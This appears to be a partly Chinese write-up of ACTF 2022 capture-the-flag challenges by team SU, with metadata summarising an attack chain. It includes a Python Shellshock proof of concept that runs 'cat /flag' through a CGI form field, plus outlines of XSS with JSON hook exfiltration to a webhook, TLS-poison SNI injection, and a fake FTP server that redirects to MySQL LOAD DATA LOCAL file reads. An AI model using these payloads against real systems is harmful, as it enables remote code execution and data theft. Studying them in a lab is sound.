---
title: ACTF Writeup by SU
contest: ACTF
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [Shellshock BASH_FUNC_env, cgi-bin/hello, WebSocket prototype pollution, JSON.stringify劫持, hook onanimationstart, XSS webhook exfil, TLS-poison client-hello, vsFTPd 3.0.3蜜罐, MySQL LOAD DATA LOCAL, file:// 协议, JSON.parse hook exfil]
attack_chain:
  - Shellshock: BASH_FUNC_env%%=(None, "() { cat /flag; exit; }") POST /cgi-bin/hello 触发
  - WebSocket XSS: sendmsg 'image' type + onanimationstart=eval(atob(...)) + animation: '1s App-logo-spin'
  - JSON.stringify hook: 备份原 JSON.stringify, 调用时改为 {api:'getflag'}
  - JSON.parse hook: 备份原 JSON.parse, 调用时 send(str) → webhook exfil
  - TLS-poison: client-hello-poisoning 注入到 SNI 后的 32 字节
  - vsFTPd 3.0.3 蜜罐: 监听 2048, USER/PASS 接受, CWD secret_path 验证
  - 227 Passive Mode (127,0,0.1,43,192) 引到 mysql://127.0.0.1:11200
  - MySQL LOAD DATA LOCAL: 触发 mysql 客户端读 /flag
key_payload: 'BASH_FUNC_env Shellshock / JSON.stringify + JSON.parse hook exfil / TLS-poison 32字节注入 / vsFTPd 蜜罐 + MySQL LOAD DATA LOCAL'
one_liner: ACTF by SU — Shellshock BASH_FUNC_env + WebSocket prototype pollution XSS + JSON.stringify/parse hook exfil + TLS-poison + vsFTPd 蜜罐 + MySQL LOAD DATA LOCAL。
lesson: Shellshock 用 BASH_FUNC_env%% 函数导出名做 RCE;JSON.stringify/parse 钩子是 Web 前端 exfil 经典;TLS-poison 利用 SNI 后字节注入;vsFTPd PASV 模式可引到 MySQL 触发 LOAD DATA LOCAL 任意文件读。
quality: high
---

# ACTF Writeup by SU

## 速读
SU 战队 — 多方向多题合集。

## Shellshock
```python
import requests
payload = {"BASH_FUNC_env%%": (None, "() { cat /flag; exit; }")}
r = requests.post("http://.../cgi-bin/hello", files=payload)
```

## WebSocket prototype pollution + XSS
- `JSON.stringify` hook: 调用时改为 `{api:'getflag'}`
- `JSON.parse` hook: 调用时 `send(str)` → webhook
- `onanimationstart=eval(atob(...))` 触发 RCE
- WebSocket 发 `sendmsg 'image'` type

## TLS-poison
- `client-hello-poisoning/custom-tls` 注入 SNI 后 32 字节
- `--certs fullchain.pem --key privkey.pem forward 2048`

## vsFTPd 蜜罐
- 监听 2048, vsFTPd 3.0.3 假 banner
- USER/PASS 接受 → CWD secret_path 校验
- PASV 引到 MySQL: `227 Entering Passive Mode (127,0,0,1,43,192)`
- MySQL LOAD DATA LOCAL 触发客户端读文件
